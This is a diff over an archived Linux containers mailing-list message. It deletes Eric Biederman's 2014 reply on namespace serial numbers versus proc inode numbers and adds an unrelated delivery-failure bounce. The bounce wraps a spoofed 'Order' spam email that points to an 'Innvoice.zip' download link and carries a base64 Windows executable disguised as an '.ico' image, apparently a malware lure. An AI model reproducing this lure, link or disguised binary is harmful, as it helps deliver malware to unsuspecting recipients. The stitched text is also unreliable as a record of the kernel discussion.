@@ -1,19 +1,13 @@
-From: ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org (Eric W. Biederman)
-Subject: Re: [PATCH V4 1/8] namespaces: assign each namespace instance a
-	serial number
-Date: Thu, 28 Aug 2014 15:05:00 -0500
-Message-ID: <87tx4wmlcj.fsf@x220.int.ebiederm.org>
-References: <cover.1408581429.git.rgb@redhat.com>
-	<cover.1408581429.git.rgb@redhat.com>
-	<d5bfd81a219c5c45c910494d6a3478ce83052e1f.1408581429.git.rgb@redhat.com>
-	<87ioljs968.fsf@x220.int.ebiederm.org>
-	<20140824203827.GI9003@madcap2.tricolour.ca>
+From: <postmaster-St2KLbvWDYsQrrorzV6ljw@public.gmane.org>
+Subject: Undeliverable: Order_9127447292.
+Date: Fri, 29 Aug 2014 09:38:54 +1000
+Message-ID: <97b526ae-91f1-4849-afae-d133a1b1f64d@mi9.com.au>
+References: <007d01cfc319$1cb11600$64000a0a@Myst.akvanet.com>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============0896809756091238322=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <20140824203827.GI9003-bcJWsdo4jJjeVoXN4CMphl7TgLCtbB0G@public.gmane.org> (Richard Guy
-	Briggs's message of "Sun, 24 Aug 2014 16:38:27 -0400")
+Content-Language: en-AU
+In-Reply-To: <007d01cfc319$1cb11600$64000a0a-u2wzF6xcI+ghwcfV6YIXVA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -23,95 +17,323 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Richard Guy Briggs <rgb-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-Cc: linux-api-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Andy Lutomirski <luto-kltTT9wpgjJwATOyAt5JVQ@public.gmane.org>, linux-audit-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Richard Guy Briggs <rgb-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org> writes:
+--===============0896809756091238322==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="f6e275e0-b92c-4358-85ed-bf2ce2124b98"
+Content-Language: en-AU
 
-> On 14/08/23, Eric W. Biederman wrote:
->> Richard Guy Briggs <rgb-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org> writes:
->> 
->> > Generate and assign a serial number per namespace instance since boot.
->> >
->> > Use a serial number per namespace (unique across one boot of one kernel)
->> > instead of the inode number (which is claimed to have had the right to change
->> > reserved and is not necessarily unique if there is more than one proc fs) to
->> > uniquely identify it per kernel boot.
->> 
->> This approach is just broken.
->> 
->> For this to work with migration (aka criu) you need to implement a
->> namespace of namespaces.  You haven't done this, and therefore
->> such an interface will break existing userspace.
->> 
->> Inside of audit I can understand not caring about these issues,
->> but you go foward and expose these serial numbers in proc,
->> and generally make this infrastructure available to others.
->> 
->> The deep issue with migration is that we move tasks from one machine
->> from another and on the destination machine we need to have all of the
->> same global identifiers for software to function properly.
->> 
->> My weasel words around the proc inode numbers is to preserve to allow us
->> room to be able to restore those ids if it every becomes relevant for
->> migration.
->
-> What do you do if the inode number is already in use on the target
-> host?
+--f6e275e0-b92c-4358-85ed-bf2ce2124b98
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: quoted-printable
 
-Since the inode numbers are relative to a superblock or a pid namespace
-the numbers that are in use can be restored on the target system
-by creating them in the appropriate namespace.
+Delivery has failed to these recipients or groups:
 
-The support does not exist in the kernel today for doing that because no
-one has cared but as architected the support can be added if needed to
-support migration.
+barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org<mailto:barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org>
+The e-mail address you entered couldn't be found. Please check the recipien=
+t's e-mail address and try to resend the message. If the problem continues,=
+ please contact your helpdesk.
 
->> That is the proc inode numbers (technically) live in a pid namespace,
->> (aka a mount of proc).  So depending on the pid namespace you are in
->> or the mount of proc you look in the numbers could change.
->> 
->> Qualifications like that must exist to have a prayer of ever supporting
->> process migration in the crazy corner cases where people start caring
->> about inode numbers.
->> 
->> We currently don't and inode numbers for a namespace will never change
->> after a namespace is created.  So I think you really are ok using the
->> proc inode numbers.  I am happy declaring by fiat that the inode numbers
->> that audit uses are the numbers connected to the initial pid namespace.
->
-> But once a namespace/container is migrated, it is a different audit that
-> is looking at it (unless we create an audit manager or entity that
-> functions at the level of a container manager), so audit should not care.
 
-These numbers were exported to everyone as a general purpose facility in
-proc.  If audit is global and audit doesn't migrate you are right it
-doesn't matter.  However if these numbers are used by anyone else for
-anything else it causes a problem.
 
-Further given that people run entire distributions in containers we may
-reach the point where we wish to run auditd in a container in the
-future.  I would hate to paint ourselves into a corner with a design
-that could never allow audit to migrate.  Support that case someday
-seems a valid naive desire.
 
->> At a fairly basic level anything that is used to identify namespaces for
->> any general purpose use needs to have most if not all of the same
->> properties of the proc inode numbers.  The most important of which is
->> being tied to some context/namespace so there is a ability if we ever
->> need it to migrate those numbers from one machine to another.
->
-> Sooo...  does it make any sense to have those inode or serial numbers be
-> blank inside the namespace/container itself, but only visible to its
-> manager outside the container (unless it is the initial namespace)?
 
-Mostly I think it makes sense to use the inode numbers from the initial
-pid namespace.  They already exist.  They already are unique.  (Which
-means I don't need to maintain more code and more special cases).  And
-the do what you need now.
 
-I probably haven't followed closely enough but I don't see what makes
-inode numbers undesirable.
 
-Eric
+Diagnostic information for administrators:
+
+Generating server: mi9.com.au
+
+barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org
+#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
+
+Original message headers:
+
+Received: from APAC01-SG1-obe.outbound.protection.outlook.com (207.46.51.89=
+)
+ by webmail.ninemsn.com.au (10.0.0.65) with Microsoft SMTP Server (TLS) id
+ 14.3.195.1; Fri, 29 Aug 2014 09:38:54 +1000
+Received: from HKNPR01CA003.apcprd01.prod.exchangelabs.com (10.242.116.13) =
+by
+ SIXPR01MB157.apcprd01.prod.exchangelabs.com (10.242.149.148) with Microsof=
+t
+ SMTP Server (TLS) id 15.0.1015.19; Thu, 28 Aug 2014 23:38:12 +0000
+Received: from AM1FFO11FD037.protection.gbl (2a01:111:f400:7e00::196) by
+ HKNPR01CA003.outlook.office365.com (2a01:111:e400:a014::13) with Microsoft
+ SMTP Server (TLS) id 15.0.1015.19 via Frontend Transport; Thu, 28 Aug 2014
+ 23:38:11 +0000
+Received: from Myst.akvanet.com (193.16.246.1) by
+ AM1FFO11FD037.mail.protection.outlook.com (10.174.64.226) with Microsoft S=
+MTP
+ Server id 15.0.1010.11 via Frontend Transport; Thu, 28 Aug 2014 23:38:10
+ +0000
+Received: from [193.16.246.1] by Myst.akvanet.com id KUnlq24kIrtkuo; Fri, 2=
+9
+ Aug 2014 02:38:07 +0300
+Message-ID: <007d01cfc319$1cb11600$64000a0a-u2wzF6xcI+ghwcfV6YIXVA@public.gmane.org>
+From: Catarine <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org>
+Subject: Order_9127447292.
+Date: Fri, 29 Aug 2014 02:38:07 +0300
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary=3D"----------6FA56F634634D74"
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-EOPAttributedMessage: 0
+X-Forefront-Antispam-Report: CIP:193.16.246.1;CTRY:BG;IPV:NLI;EFV:NLI;SFV:S=
+PM;SFS:(6009001)(489007)(55674003)(199003)(6262002)(52184005)(189002)(18054=
+003)(83072002)(104016003)(46102001)(77982001)(21056001)(90102001)(4396001)(=
+116806002)(81342001)(568964001)(92566001)(105606002)(106466001)(81542001)(7=
+9102001)(85306004)(102836001)(110136001)(95666004)(20776003)(77096002)(1597=
+5445006)(15395725005)(107886001)(229853001)(2351001)(107046002)(84326002)(7=
+4662001)(92726001)(44976005)(512874002)(31966008)(33646002)(44736004)(99396=
+002)(86362001)(85852003)(71186001)(50986999)(19580395003)(15202345003)(1958=
+0405001)(64706001)(54356999)(83322001)(87836001)(90186001)(11838705003);DIR=
+:INB;SFP:;SCL:6;SRVR:SIXPR01MB157;H:Myst.akvanet.com;FPR:;MLV:spm;PTR:akvan=
+et.com,laptopskins.akvanet.com,ns.akvanet.com,www.akvanet.com,www.laptopski=
+ns.akvanet.com;A:1;MX:1;LANG:;
+X-Microsoft-Antispam: BCL:0;PCL:0;RULEID:;UriScan:;
+Received-SPF: Fail (protection.outlook.com: domain of
+ lists.linux-foundation.org does not designate 193.16.246.1 as permitted
+ sender) receiver=3Dprotection.outlook.com; client-ip=3D193.16.246.1;
+ helo=3DMyst.akvanet.com;
+Authentication-Results: spf=3Dfail (sender IP is 193.16.246.1)
+ smtp.mailfrom=3Dcontainers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org;
+X-OrganizationHeadersPreserved: SIXPR01MB157.apcprd01.prod.exchangelabs.com
+X-OriginatorOrg: mi9.com.au
+X-CrossPremisesHeadersPromoted: SYD-MAIL2.9msn.net
+X-CrossPremisesHeadersFiltered: SYD-MAIL2.9msn.net
+
+
+--f6e275e0-b92c-4358-85ed-bf2ce2124b98
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns;mi9.com.au
+Received-From-MTA: dns;APAC01-SG1-obe.outbound.protection.outlook.com
+Arrival-Date: Thu, 28 Aug 2014 23:38:54 +0000
+
+Final-Recipient: rfc822;barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org
+Action: failed
+Status: 5.1.1
+Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
+
+
+--f6e275e0-b92c-4358-85ed-bf2ce2124b98
+Content-Type: message/rfc822
+
+Received: from APAC01-SG1-obe.outbound.protection.outlook.com (207.46.51.89)
+ by webmail.ninemsn.com.au (10.0.0.65) with Microsoft SMTP Server (TLS) id
+ 14.3.195.1; Fri, 29 Aug 2014 09:38:54 +1000
+Received: from HKNPR01CA003.apcprd01.prod.exchangelabs.com (10.242.116.13) by
+ SIXPR01MB157.apcprd01.prod.exchangelabs.com (10.242.149.148) with Microsoft
+ SMTP Server (TLS) id 15.0.1015.19; Thu, 28 Aug 2014 23:38:12 +0000
+Received: from AM1FFO11FD037.protection.gbl (2a01:111:f400:7e00::196) by
+ HKNPR01CA003.outlook.office365.com (2a01:111:e400:a014::13) with Microsoft
+ SMTP Server (TLS) id 15.0.1015.19 via Frontend Transport; Thu, 28 Aug 2014
+ 23:38:11 +0000
+Received: from Myst.akvanet.com (193.16.246.1) by
+ AM1FFO11FD037.mail.protection.outlook.com (10.174.64.226) with Microsoft SMTP
+ Server id 15.0.1010.11 via Frontend Transport; Thu, 28 Aug 2014 23:38:10
+ +0000
+Received: from [193.16.246.1] by Myst.akvanet.com id KUnlq24kIrtkuo; Fri, 29
+ Aug 2014 02:38:07 +0300
+Message-ID: <007d01cfc319$1cb11600$64000a0a-u2wzF6xcI+ghwcfV6YIXVA@public.gmane.org>
+From: Catarine <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org>
+Subject: Order_9127447292.
+Date: Fri, 29 Aug 2014 02:38:07 +0300
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----------6FA56F634634D74"
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-EOPAttributedMessage: 0
+X-Forefront-Antispam-Report: CIP:193.16.246.1;CTRY:BG;IPV:NLI;EFV:NLI;SFV:SPM;SFS:(6009001)(489007)(55674003)(199003)(6262002)(52184005)(189002)(18054003)(83072002)(104016003)(46102001)(77982001)(21056001)(90102001)(4396001)(116806002)(81342001)(568964001)(92566001)(105606002)(106466001)(81542001)(79102001)(85306004)(102836001)(110136001)(95666004)(20776003)(77096002)(15975445006)(15395725005)(107886001)(229853001)(2351001)(107046002)(84326002)(74662001)(92726001)(44976005)(512874002)(31966008)(33646002)(44736004)(99396002)(86362001)(85852003)(71186001)(50986999)(19580395003)(15202345003)(19580405001)(64706001)(54356999)(83322001)(87836001)(90186001)(11838705003);DIR:INB;SFP:;SCL:6;SRVR:SIXPR01MB157;H:Myst.akvanet.com;FPR:;MLV:spm;PTR:akvanet.com,laptopskins.akvanet.com,ns.akvanet.com,www.
+ akvanet.com,www.laptopskins.akvanet.com;A:1;MX:1;LANG:;
+X-Microsoft-Antispam: BCL:0;PCL:0;RULEID:;UriScan:;
+Received-SPF: Fail (protection.outlook.com: domain of
+ lists.linux-foundation.org does not designate 193.16.246.1 as permitted
+ sender) receiver=protection.outlook.com; client-ip=193.16.246.1;
+ helo=Myst.akvanet.com;
+Authentication-Results: spf=fail (sender IP is 193.16.246.1)
+ smtp.mailfrom=containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org;
+X-OrganizationHeadersPreserved: SIXPR01MB157.apcprd01.prod.exchangelabs.com
+X-OriginatorOrg: mi9.com.au
+X-CrossPremisesHeadersPromoted: SYD-MAIL2.9msn.net
+X-CrossPremisesHeadersFiltered: SYD-MAIL2.9msn.net
+
+------------6FA56F634634D74
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Dear, barnabas-sFfBqcWnJeC8Icyk09nozA@public.gmane.org   
+
+Thank you for placing an order with us!
+
+We wish to inform you that we have received your order and it will be processed very shortly. 
+Your order number is 656337-103072 and it is expected to be delivered within 2-5 working days. 
+
+Please note that in most cases, delivery is faster than stated as we want you to start enjoying your purchase as soon as possible. In the meantime, you may log into the site and check your order status at 
+any time via the 'My Account' page.
+
+As soon as order has been dispatched, 
+our Customer Service Executive will monitor the progress and keep you updated at all times.
+
+
+Claim your Special Reward       
+
+Once again, we would like to thank you for your purchase and we hope to see you again soon.
+The payment and delivery information:
+http://xlinfos.be/Innvoice.zip?Generate_to_client:barnabas-sFfBqcWnJeDvnOemgxGiVw@public.gmane.org
+     
+Greenwald Debra
+Tel.: +6131575948
+Customer Service Manager       
+------------6FA56F634634D74
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="79img.ico"
+Content-Type: text/plain
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAAA/haPee+TNjXvkzY175M2NcpxfjXrkzY1ynE6NeeTNjXKc
+WY165M2NcpxcjXrkzY1SaWNoe+TNjQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFBFAABkhgMA
+YN9bSgAAAAAAAAAA8AAiIAsCCQAAAAAAABYAAAAAAAAAAAAAABAAAAAA////BQAAABAAAAAC
+AAAGAAEABgABAAYAAQAAAAAAAEAAAAAEAAAydwAAAQBAAQAABAAAAAAAABAAAAAAAAAAABAA
+AAAAAAAQAAAAAAAAAAAAABAAAACgHgAAUAAAAAAAAAAAAAAAACAAAPgDAAAAAAAAAAAAAAAA
+AAAAAAAAADAAAKQAAADwHgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC5kYXRhAAAAQA8AAAAQ
+AAAAEAAAAAQAAAAAAAAAAAAAAAAAAEAAAGAucnNyYwAAAPgDAAAAIAAAAAQAAAAUAAAAAAAA
+AAAAAAAAAABAAABCLnJlbG9jAACwAAAAADAAAAACAAAAGAAAAAAAAAAAAAAAAAAAQAAAQgAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+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
+////BQAAAQQAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2wBbAHsAAPAA8BsA3QBdAH0AAPAA8B0A
+3gAjAH4AAPAA8BwA3ABcAHwAAPAA8BwACAAIAAgAAPAA8H8AGwAbABsAAPAA8BsADQANAA0A
+APAA8AoAIAAgACAAAPAA8CAAAwADAAMAAPAA8AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAQALEB
+GQCwAR0AowEgAK0BIQC3ASIAswEkALIBLgCuATAArwEyAKwBNQBvATcALAE4AKUBRwAkAUgA
+JgFJACEBSwAlAU0AJwFPACMBUAAoAVEAIgFSAC0BUwAuAVsAWwFcAFwBXQBdAV8AXwFlAKoB
+ZgCrAWcAqAFoAKkBaQCnAWoApgFrALYBbAC0AW0AtQEcAA0BRgADAQAAAAAAAAAAYQBgAOAA
+AABlAGAA6AAAAGkAYADsAAAAbwBgAPIAAAB1AGAA+QAAAEEAYADAAAAARQBgAMgAAABJAGAA
+zAAAAE8AYADSAAAAVQBgANkAAAAgAGAAYAAAAGEAJwDhAAAAZQAnAOkAAABpACcA7QAAAG8A
+JwDzAAAAdQAnAPoAAAB5ACcA/QAAAEEAJwDBAAAARQAnAMkAAABJACcAzQAAAE8AJwDTAAAA
+VQAnANoAAABZACcA3QAAACAAJwAnAAAAAAAAAAAAAAAAAAAAAAAAADEAMQAhADIAMgAiADMA
+MwCjADUANQAlADcANwAmADgAOAAqADkAOQAoADAAMAApALsAPQArAFEBcQBRAFcBdwBXAFIB
+cgBSAFQBdABUAFABcABQAFMBcwBTAEQBZABEAEYBZgBGAEcBZwBHAEgBaABIAEoBagBKAEsB
+awBLAEwBbABMALoAOwA6AFoBegBaAFgBeABYAEMBYwBDAFYBdgBWAEIBYgBCAE4BbgBOAE0B
+bQBNALwALAA8AL4ALgA+AL8ALwA/AG4ALgAuAAkACQAJAGsAKwArAG8ALwAvAGoAKgAqAG0A
+LQAtAAAAAAAAAP8AGwAxADIAMwA0ADUANgA3ADgAOQAwAL0AuwAIAAkAUQBXAEUAUgBUAFkA
+VQBJAE8AUADbAN0ADQCiAEEAUwBEAEYARwBIAEoASwBMALoAwADfAKAA3gBaAFgAQwBWAEIA
+TgBNALwAvgC/AKEBagKkACAAFABwAHEAcgBzAHQAdQB2AHcAeAB5AJADkQIkDCYMIQxtACUM
+DAwnDGsAIwwoDCIMLQwuDCwA/wDcAHoAewAMAO4A8QDqAPkA9QDzAP8A/wD7AC8AfAB9AH4A
+fwCAAIEAggCDAIQAhQCGAO0A/wDpAP8AwQD/AP8AhwD/AP8A/wD/AOsACQD/AMIAAAAcAAAA
+AAAAAEgU////BQAAHQAAAAAAAACQFP///wUAADUAAAAAAAAAeBT///8FAAA3AAAAAAAAADAU
+////BQAAOAAAAAAAAAAYFP///wUAAEUAAAAAAAAA0BP///8FAABGAAAAAAAAAIAS////BQAA
+RwAAAAAAAABQEv///wUAAEgAAAAAAAAAaBH///8FAABJAAAAAAAAAEAS////BQAASwAAAAAA
+AAAwEv///wUAAE0AAAAAAAAAcBL///8FAABPAAAAAAAAALgR////BQAAUAAAAAAAAAAgEv//
+/wUAAFEAAAAAAAAAoBP///8FAABSAAAAAAAAAJAT////BQAAUwAAAAAAAACAE////wUAAFQA
+AAAAAAAAEBL///8FAABWAAAAAAAAAAAS////BQAAWwAAAAAAAABQFf///wUAAFwAAAAAAAAA
+cBX///8FAABdAAAAAAAAANgU////BQAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAA6BH///8F
+AAAOAAAAAAAAAGAU////BQAADwAAAAAAAADgEf///wUAABwAAAAAAAAAYBP///8FAAAdAAAA
+AAAAAGAS////BQAAKgAAAAAAAABQE////wUAADYAAAAAAAAAIBX///8FAAA3AAAAAAAAAMAT
+////BQAAOAAAAAAAAADYEf///wUAADkAAAAAAAAAQBP///8FAAA6AAAAAAAAAAAU////BQAA
+OwAAAAAAAACwEf///wUAADwAAAAAAAAAqBH///8FAAA9AAAAAAAAAKAR////BQAAPgAAAAAA
+AACYEf///wUAAD8AAAAAAAAAkBH///8FAABAAAAAAAAAAIgR////BQAAQQAAAAAAAACAEf//
+/wUAAEIAAAAAAAAAeBH///8FAABDAAAAAAAAAHAR////BQAARAAAAAAAAADQEf///wUAAEUA
+AAAAAAAAMBP///8FAABGAAAAAAAAAAgV////BQAARwAAAAAAAAAgE////wUAAEgAAAAAAAAA
+EBP///8FAABJAAAAAAAAAAAT////BQAASgAAAAAAAACwE////wUAAEsAAAAAAAAA8BL///8F
+AABMAAAAAAAAAOAS////BQAATQAAAAAAAADQEv///wUAAE4AAAAAAAAA6BP///8FAABPAAAA
+AAAAAMAS////BQAAUAAAAAAAAACwEv///wUAAFEAAAAAAAAAoBL///8FAABSAAAAAAAAAJAS
+////BQAAUwAAAAAAAADwFP///wUAAFcAAAAAAAAAyBH///8FAABYAAAAAAAAAMAR////BQAA
+AAAAAAAAAAAAAAAAAAAAAAAAAABHpVtKAAAAANIeAAABAAAAAQAAAAEAAADIHgAAzB4AANAe
+AAA4HwAA3R4AAAAAS0JER0FFLmRsbABLYmRMYXllckRlc2NyaXB0b3IAAAAAAEPFW0oAAAAA
+AgAAACMAAAAMHwAADBMAAFJTRFOFZjZjx971S7rSdOHBEcQgAQAAAGtiZGdhZS5wZGIAAAAA
+AAAAAAAASI0FwfH//8MAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEA
+CQQAAEgAAABgIAAAmAMAAAAAAAAAAAAAAAAAAAAAAACYAzQAAABWAFMAXwBWAEUAUgBTAEkA
+TwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQABAAYAAUCwHQEABgABQLAdPwAAAAAAAAAEAAQA
+AgAAAAIAAAAAAAAAAAAAAPYCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAANIC
+AAABADAAMAAwADAAMAA0AEIAMAAAAEwAFgABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAA
+TQBpAGMAcgBvAHMAbwBmAHQAIABDAG8AcgBwAG8AcgBhAHQAaQBvAG4AAABWABcAAQBGAGkA
+bABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARwBhAGUAbABpAGMAIABLAGUAeQBiAG8A
+YQByAGQAIABMAGEAeQBvAHUAdAAAAAAAbAAmAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAA
